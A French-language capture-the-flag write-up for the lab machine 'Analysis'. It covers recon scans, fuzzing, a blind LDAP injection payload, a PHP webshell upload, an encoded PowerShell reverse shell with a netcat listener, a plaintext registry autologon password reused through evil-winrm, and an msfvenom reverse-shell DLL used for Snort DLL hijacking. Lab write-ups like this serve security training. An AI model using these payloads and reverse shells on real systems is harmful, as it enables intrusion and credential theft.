  # Analysis 

	echo "10.10.11.250 analysis.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.250 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.250 -oN nmap.txt
	feroxbuster --silent -u http://analysis.htb
	
Scans classiques.

    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-27 08:48:07Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    3306/tcp  open  mysql         MySQL (unauthorized)
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    9389/tcp  open  mc-nmf        .NET Message Framing
    33060/tcp open  mysqlx?
    47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    49664/tcp open  msrpc         Microsoft Windows RPC
    49665/tcp open  msrpc         Microsoft Windows RPC
    49666/tcp open  msrpc         Microsoft Windows RPC
    49667/tcp open  msrpc         Microsoft Windows RPC
    49669/tcp open  msrpc         Microsoft Windows RPC
    49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49671/tcp open  msrpc         Microsoft Windows RPC
    49672/tcp open  msrpc         Microsoft Windows RPC
    49683/tcp open  msrpc         Microsoft Windows RPC
    49696/tcp open  msrpc         Microsoft Windows RPC
    49709/tcp open  msrpc         Microsoft Windows RPC
    49713/tcp open  msrpc         Microsoft Windows RPC
    56849/tcp open  msrpc         Microsoft Windows RPC


Fuzzing supplémentaire : 

	ffuf -H "Host: FUZZ.analysis.htb" -u http://analysis.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt

Un sous-domaine existe : 

>internal                [Status: 403, Size: 1268, Words: 74, Lines: 30, Duration: 494ms]



    echo "10.10.11.250 internal.analysis.htb" >> /etc/hosts
	feroxbuster --silent -u http://internal.analysis.htb/

Quelques chemins intéressants retournés mais tous en 403 voire en 404: 

- http://internal.analysis.htb/dashboard/uploads/ 
- http://internal.analysis.htb/employees/
- http://internal.analysis.htb/users/

En cherchant des fichiers dans ces dossiers on finit par tomber sur un fichier **list.php** sous /users/ : 

    ffuf -u http://internal.analysis.htb/users/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -e html,js,php,asp,pdf,txt,zip,log,ini,db
    
> list.php                [Status: 200, Size: 17, Words: 2, Lines: 1, Duration: 43ms]

Il y a également un fichier **login.php** sous /employees/ : 

> login.php               [Status: 200, Size: 1085, Words: 413, Lines: 30, Duration: 70ms]

Ce fichier amène sur une page de login mais impossible de la contourner.

En revanche le chemin http://internal.analysis.htb/users/list.php retourne une erreur **"missing parameter"** qui laisse penser qu'il faut pousser le fuzzing jusqu'aux paramètres : 

    ffuf -u http://internal.analysis.htb/users/list.php?FUZZ=abc -w /usr/share/wordlists/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt -fs 17

Le paramètre "name" renvoie un résultat différent : 

> name                    [Status: 200, Size: 406, Words: 11, Lines: 1, Duration: 54ms]

En regardant l'URL http://internal.analysis.htb/users/list.php?name=abc graphiquement on observe un résultat de recherche vide.

J'ai essayé de faire bugger le backend en mettant des caractères spéciaux mais sans succès. En revanche, mettre un wildcard ('*') a renvoyé un résultat **"technician"**

Le couple technician / technician ne fonctionne pas pour le login sur la page /employees/login.php mais une Blind LDAP Injection semble possible dans le paramètre name.

En effet, le payload **name=*)(name=u** renvoie le résultat vide alors que le payload **name=*)(name=t** renvoie bien l'utilisateur "technician".

Il faut donc reproduire ce test en boucle pour déduire tout le mot de passe du compte. En scriptant cette injection, on trouve bien le mot de passe comme prévu. Voir mon script Blind_LDAP.py


Avec ce compte on peut bien se connecter sur la page /employees/login.php

Sur la page http://internal.analysis.htb/dashboard/form.php on a la possibilité d'envoyer des choses à exécuter. La page http://internal.analysis.htb/dashboard/uploads/ est maintenant aussi accessible et semble contenir les fichiers envoyés. 

On peut donc tout simplement envoyer un webshell en PHP par exemple.

En allant sur http://internal.analysis.htb/dashboard/uploads/shell.php on a ensuite accès au webshell, que l'on pourra facilement convertir : 

    powershell -e JABjA...AApAA==
    ...
    rlwrap nc -nvlp 9999
    ...
    whoami 

>analysis\svc_web


## Pivoting

    upload winpeas.exe
    upload PrivEscCheck.ps1
    
    .\winpeas.exe
    Import-Module .\PrivEscCheck.ps1
    Invoke-PrivEscCheck -Extended
    
Un mot de passe est trouvé pour **"jdoe"**

Autre commande pour le trouver : 

    reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

Résultat : 
    
    ...
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    7y4Z4^*y9Zzj
    AutoLogonSID    REG_SZ    S-1-5-21-916175351-3772503854-3498620144-1103
    LastUsedUsername    REG_SZ    jdoe
    ...
    
Connexion avec ce compte : 

     evil-winrm -u 'ANALYSIS\jdoe' -p '7y4Z4^*y9Zzj' -i 10.10.11.250 
     cd ../Desktop
     type user.txt

## Élévation de privilèges

    upload winpeas.exe
    upload PrivEscCheck.ps1
    
    .\winpeas.exe
    Import-Module .\PrivEscCheck.ps1 
    Invoke-PrivEscCheck -Extended

Une vulnérabilité de type DLL Hijacking est trouvée dans Snort. 

Voir : https://www.h4k-it.com/installing-and-configuring-snort/

Côté cible : 

    cd C:\snort\lib\snort_dynamicpreprocessor
    upload sf_engine.dll

Côté attaquant : 

    msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.11 LPORT=9999 -f dll > sf_engine.dll
    
    rlwrap nc -nvlp 9999
    ...
    whoami 
    type C:\Users\Administrateur\Desktop\root.txt
